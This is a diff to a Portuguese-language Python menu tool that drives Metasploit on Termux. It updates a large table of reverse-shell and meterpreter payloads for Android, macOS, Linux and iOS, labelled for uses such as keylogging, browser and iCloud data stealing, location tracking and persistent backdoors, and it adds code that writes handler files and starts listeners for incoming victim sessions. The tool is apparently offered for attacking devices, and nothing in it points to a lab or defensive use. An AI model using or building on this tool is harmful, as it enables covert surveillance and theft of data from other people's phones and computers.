@@ -24,6 +24,36 @@ def print_banner():
     """
     print(banner)
 
+def check_metasploit():
+    """Verifica se o Metasploit está instalado de forma mais robusta"""
+    try:
+        # Método 1: Verificar se msfconsole está no PATH
+        result = subprocess.run(['which', 'msfconsole'], capture_output=True, text=True)
+        if result.returncode == 0:
+            return True
+        
+        # Método 2: Verificar se existe no diretório comum do Termux
+        common_paths = [
+            '/data/data/com.termux/files/usr/bin/msfconsole',
+            '/usr/bin/msfconsole',
+            '/bin/msfconsole',
+            '/data/data/com.termux/files/usr/opt/metasploit-framework/msfconsole'
+        ]
+        
+        for path in common_paths:
+            if os.path.exists(path):
+                return True
+                
+        # Método 3: Tentar executar diretamente
+        test_cmd = subprocess.run(['msfconsole', '--version'], capture_output=True, text=True, timeout=5)
+        if test_cmd.returncode == 0 or test_cmd.returncode == 1:  # Metasploit geralmente retorna 1 para --version
+            return True
+            
+        return False
+        
+    except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
+        return False
+
 # Dicionário completo de payloads por plataforma
 PAYLOADS = {
     'ANDROID': {
@@ -136,38 +166,38 @@ PAYLOADS = {
         23: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Audio Recording'},
         24: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Microphone Spy'},
         25: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'File Vault Exploit'},
-        26: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Password Dumper'},
-        27: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'iCloud Data Stealer'},
-        28: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Safari Data Stealer'},
-        29: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Chrome Data Stealer'},
-        30: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Firefox Data Stealer'}
+        26: {'name': 'osx/x86/meterpreter/reverse_tcp', 'description': 'Password Dumper'},
+        27: {'name': 'osx/x86/meterpreter/reverse_tcp', 'description': 'iCloud Data Stealer'},
+        28: {'name': 'osx/x86/meterpreter/reverse_tcp', 'description': 'Safari Data Stealer'},
+        29: {'name': 'osx/x86/meterpreter/reverse_tcp', 'description': 'Chrome Data Stealer'},
+        30: {'name': 'osx/x86/meterpreter/reverse_tcp', 'description': 'Firefox Data Stealer'}
     },
     'LINUX': {
         1: {'name': 'linux/x86/shell_reverse_tcp', 'description': 'Reverse TCP Shell x86'},
         2: {'name': 'linux/x86/shell/reverse_http', 'description': 'Reverse HTTP Shell'},
         3: {'name': 'linux/x86/shell/reverse_https', 'description': 'Reverse HTTPS Shell'},
         4: {'name': 'linux/x86/shell_bind_tcp', 'description': 'Bind TCP Shell'},
-        5: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
-        6: {'name': 'linux/x86/meterpreter_reverse_http', 'description': 'Meterpreter Reverse HTTP'},
-        7: {'name': 'linux/x86/meterpreter_reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
+        5: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
+        6: {'name': 'linux/x86/meterpreter/reverse_http', 'description': 'Meterpreter Reverse HTTP'},
+        7: {'name': 'linux/x86/meterpreter/reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
         8: {'name': 'linux/x64/shell_reverse_tcp', 'description': 'Reverse TCP Shell x64'},
-        9: {'name': 'linux/x64/meterpreter_reverse_tcp', 'description': 'Meterpreter Reverse TCP x64'},
+        9: {'name': 'linux/x64/meterpreter/reverse_tcp', 'description': 'Meterpreter Reverse TCP x64'},
         10: {'name': 'linux/x86/shell_reverse_udp', 'description': 'Reverse UDP Shell'},
         11: {'name': 'cmd/unix/reverse_python', 'description': 'Python Reverse Shell'},
         12: {'name': 'cmd/unix/reverse_perl', 'description': 'Perl Reverse Shell'},
         13: {'name': 'cmd/unix/reverse_bash', 'description': 'Bash Reverse Shell'},
-        14: {'name': 'php/meterpreter_reverse_tcp', 'description': 'PHP Reverse Shell'},
+        14: {'name': 'php/meterpreter/reverse_tcp', 'description': 'PHP Reverse Shell'},
         15: {'name': 'ruby/shell_reverse_tcp', 'description': 'Ruby Reverse Shell'},
         16: {'name': 'linux/x86/shell_reverse_tcp', 'description': 'Netcat Backdoor'},
-        17: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'SSH Backdoor'},
-        18: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Cron Persistence'},
-        19: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Systemd Service'},
-        20: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Library Injection'},
-        21: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Process Hollowing'},
-        22: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Memory Dumper'},
-        23: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Keylogger'},
-        24: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Screenshot Capture'},
-        25: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Webcam Capture'},
+        17: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'SSH Backdoor'},
+        18: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Cron Persistence'},
+        19: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Systemd Service'},
+        20: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Library Injection'},
+        21: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Process Hollowing'},
+        22: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Memory Dumper'},
+        23: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Keylogger'},
+        24: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Screenshot Capture'},
+        25: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Webcam Capture'},
         26: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Audio Recording'},
         27: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Network Sniffer'},
         28: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Packet Capturer'},
@@ -175,26 +205,26 @@ PAYLOADS = {
         30: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Vulnerability Scanner'}
     },
     'IOS': {
-        1: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Reverse TCP Shell ARM64'},
-        2: {'name': 'apple_ios/aarch64/meterpreter_reverse_http', 'description': 'Reverse HTTP Shell'},
-        3: {'name': 'apple_ios/aarch64/meterpreter_reverse_https', 'description': 'Reverse HTTPS Shell'},
-        4: {'name': 'apple_ios/aarch64/meterpreter_bind_tcp', 'description': 'Bind TCP Shell'},
-        5: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
-        6: {'name': 'apple_ios/aarch64/meterpreter_reverse_http', 'description': 'Meterpreter Reverse HTTP'},
-        7: {'name': 'apple_ios/aarch64/meterpreter_reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
+        1: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Reverse TCP Shell ARM64'},
+        2: {'name': 'apple_ios/aarch64/meterpreter/reverse_http', 'description': 'Reverse HTTP Shell'},
+        3: {'name': 'apple_ios/aarch64/meterpreter/reverse_https', 'description': 'Reverse HTTPS Shell'},
+        4: {'name': 'apple_ios/aarch64/meterpreter/bind_tcp', 'description': 'Bind TCP Shell'},
+        5: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
+        6: {'name': 'apple_ios/aarch64/meterpreter/reverse_http', 'description': 'Meterpreter Reverse HTTP'},
+        7: {'name': 'apple_ios/aarch64/meterpreter/reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
         8: {'name': 'apple_ios/armle/shell_reverse_tcp', 'description': 'Reverse Shell ARM'},
         9: {'name': 'apple_ios/aarch64/shell_reverse_tcp', 'description': 'Reverse Shell ARM64'},
-        10: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Apple Script Backdoor'},
+        10: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Apple Script Backdoor'},
         11: {'name': 'apple_ios/browser/safari_libtiff', 'description': 'Safari Exploit'},
         12: {'name': 'apple_ios/browser/webkit', 'description': 'WebKit RCE'},
-        13: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Jailbreak Detection Bypass'},
-        14: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Sandbox Escape'},
-        15: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Persistent Backdoor'},
-        16: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Background Execution'},
-        17: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Location Tracker'},
-        18: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Microphone Access'},
-        19: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Camera Access'},
-        20: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Photo Library Stealer'}
+        13: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Jailbreak Detection Bypass'},
+        14: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Sandbox Escape'},
+        15: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Persistent Backdoor'},
+        16: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Background Execution'},
+        17: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Location Tracker'},
+        18: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Microphone Access'},
+        19: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Camera Access'},
+        20: {'name': 'apple_ios/aarch64/meterpreter/reverse_tcp', 'description': 'Photo Library Stealer'}
     }
 }
 
@@ -238,16 +268,6 @@ def get_listener_config(platform, payload_type):
     
     return lhost, lport, payload_name
 
-def check_metasploit_installed():
-    """Verifica se o Metasploit está instalado de forma silenciosa"""
-    try:
-        result = subprocess.run(['which', 'msfconsole'], 
-                              capture_output=True, 
-                              text=True)
-        return result.returncode == 0
-    except:
-        return False
-
 def generate_handler_file(platform, payload_type, lhost, lport, payload_name):
     """Gera arquivo de handler para Metasploit"""
     
@@ -258,7 +278,6 @@ set LHOST {lhost}
 set LPORT {lport}
 set ExitOnSession false
 set EnableStageEncoding true
-set AutoRunScript multi_console_command -rc /opt/scripts/autorun.rc
 """
 
     # Configurações específicas baseadas na plataforma e tipo
@@ -268,7 +287,7 @@ set AutoRunScript multi_console_command -rc /opt/scripts/autorun.rc
         elif payload_type in [3, 7]:
             handler_content += "set LHOST https://" + lhost + "\n"
         elif payload_type == 42:
-            handler_content += "set PAYLOAD android/shell/reverse_udp\n"
+            handler_content = handler_content.replace(payload_name, 'android/shell/reverse_udp')
         
         # Adicionar módulos post-exploitation para Android
         if payload_type in [11, 18, 32]:  # Vídeo, câmera, gravação de tela
@@ -320,6 +339,7 @@ set AutoRunScript multi_console_command -rc /opt/scripts/autorun.rc
     try:
         with open(handler_file, 'w') as f:
             f.write(handler_content)
+        print(f"📁 Handler salvo como: {handler_file}")
         return handler_file
     except Exception as e:
         print(f"⚠️  Erro ao criar handler: {str(e)}")
@@ -331,15 +351,6 @@ def start_listener(platform, payload_type, lhost, lport, payload_name):
     print(f"\n🎯 Iniciando Listener para {platform}")
     print(f"📡 Payload: {PAYLOADS[platform][payload_type]['description']}")
     print(f"🌐 LHOST: {lhost} | LPORT: {lport}")
-    
-    # Verificar se Metasploit está instalado
-    if not check_metasploit_installed():
-        print("❌ METASPLOIT NÃO ENCONTRADO!")
-        print("💡 Volte ao menu inicial de malware e escolha a opção:")
-        print("   📥 install-metasploit-termux.py")
-        input("\n⏎ Pressione Enter para voltar ao menu...")
-        return False
-    
     print("⏳ Iniciando Metasploit...")
     
     # Gerar arquivo de handler
@@ -356,17 +367,17 @@ def start_listener(platform, payload_type, lhost, lport, payload_name):
         print(f"\n🔧 Executando: msfconsole -r {handler_file}")
         print("💡 Pressione Ctrl+C para parar o listener")
         print("🔄 Aguardando conexões...\n")
+        print("="*50)
         
         # Executar Metasploit
-        subprocess.run(cmd)
+        process = subprocess.Popen(cmd)
+        process.wait()
         
         return True
         
     except FileNotFoundError:
         print("\n❌ Metasploit não encontrado!")
-        print("💡 Volte ao menu inicial de malware e escolha a opção:")
-        print("   📥 install-metasploit-termux.py")
-        input("\n⏎ Pressione Enter para voltar ao menu...")
+        print("📥 Instale com: pkg install metasploit")
         return False
     except KeyboardInterrupt:
         print("\n🛑 Listener interrompido pelo usuário")
@@ -455,8 +466,33 @@ def quick_start_listener():
     print("❌ Configuração rápida cancelada")
     return False
 
+def show_installation_guide():
+    """Mostra guia de instalação do Metasploit"""
+    print("\n📥 GUIA DE INSTALAÇÃO DO METASPLOIT")
+    print("="*50)
+    print("1. Atualize o Termux:")
+    print("   pkg update && pkg upgrade")
+    print("\n2. Instale dependências:")
+    print("   pkg install wget curl python ruby")
+    print("\n3. Instale o Metasploit:")
+    print("   pkg install metasploit")
+    print("\n4. Ou use instalação alternativa:")
+    print("   curl -LO https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh")
+    print("   chmod +x metasploit.sh")
+    print("   ./metasploit.sh")
+    print("\n5. Inicie o Metasploit:")
+    print("   msfconsole")
+    print("="*50)
+
 def main():
     """Função principal"""
+    
+    # Verificar Metasploit apenas uma vez no início
+    if not check_metasploit():
+        print("❌ Metasploit não encontrado!")
+        show_installation_guide()
+        if input("\nDeseja continuar mesmo assim? (s/n): ").lower() != 's':
+            sys.exit(1)
     
     while True:
         clear_screen()
@@ -468,6 +504,7 @@ def main():
         print("[1] Selecionar Plataforma e Payload")
         print("[2] Início Rápido (Listener Padrão)") 
         print("[3] Ver Todos os Payloads")
+        print("[4] Testar Metasploit")
         print("[0] Sair")
         print("="*60)
         
@@ -504,7 +541,7 @@ def main():
                                 if payload_choice == '0':
                                     break
                                 elif payload_choice == '99':
-                                    # Iniciar listener
+                                    # Iniciar listener com payload padrão
                                     lhost, lport, payload_name = get_listener_config(platform, 1)
                                     start_listener(platform, 1, lhost, lport, payload_name)
                                     input("\n⏎ Pressione Enter para continuar...")
@@ -537,8 +574,26 @@ def main():
                 print("="*70)
                 for platform in PAYLOADS:
                     print(f"\n{platform}: {len(PAYLOADS[platform])} payloads disponíveis")
+                    for i in range(1, min(4, len(PAYLOADS[platform]) + 1)):
+                        print(f"  {i}. {PAYLOADS[platform][i]['description']}")
                 print("\n" + "="*70)
                 input("\n⏎ Pressione Enter para voltar...")
+            
+            elif choice == '4':
+                print("\n🔍 Testando Metasploit...")
+                if check_metasploit():
+                    print("✅ Metasploit encontrado e funcionando!")
+                    try:
+                        # Teste rápido de versão
+                        result = subprocess.run(['msfconsole', '--version'], capture_output=True, text=True, timeout=10)
+                        if result.returncode in [0, 1]:
+                            print("📋 Metasploit responde corretamente!")
+                    except:
+                        print("⚠️  Metasploit instalado mas com possíveis problemas")
+                else:
+                    print("❌ Metasploit não encontrado!")
+                    show_installation_guide()
+                input("\n⏎ Pressione Enter para continuar...")
             
             elif choice == '0':
                 print("\n👋 Saindo... Use com responsabilidade!")
